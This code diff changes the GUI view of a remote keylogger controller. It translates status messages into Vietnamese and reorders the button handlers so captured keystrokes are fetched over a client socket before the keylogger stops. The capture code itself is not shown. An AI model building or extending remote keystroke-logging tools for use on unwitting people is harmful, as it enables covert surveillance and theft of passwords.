@@ -1,3 +1,4 @@
+import time
 from tkinter import messagebox
 import tkinter as tk
 from model.CL_model import WidgetFactory
@@ -37,12 +38,13 @@ class keylogger_view:
     
     def btn_start_keylogger_click(self):
         self.controller.start_keylogger(self.client_socket)
-        self.show_message("Keylogger started!")
+        self.show_message("Bắt đầu bắt phím Keylogger!")
                 
     def btn_stop_keylogger_click(self):
+        self.btn_print_keylogger_click() #Xuất phím đã nhập ra textbox trước khi stop
+        time.sleep(0.1)
         self.controller.stop_keylogger(self.client_socket)
-        self.btn_print_keylogger_click()
-        self.show_message("Keys fetched and Keylogger stopped.")       
+        self.show_message("Đã in phím bắt và đã dừng keylogger.")       
     
     def btn_print_keylogger_click(self):
         self.text_bat_keylogger.delete("1.0", "end")
@@ -51,7 +53,7 @@ class keylogger_view:
 
     def btn_clear_click(self):   
         self.clear_text_widget()
-        self.show_message("Text widget cleared.")
+        self.show_message("Xóa nội dung phím bắt.")
     
     def update_text_widget(self, text):        
         # Kiểm tra và xóa chuỗi "Unknown Command" nếu có       
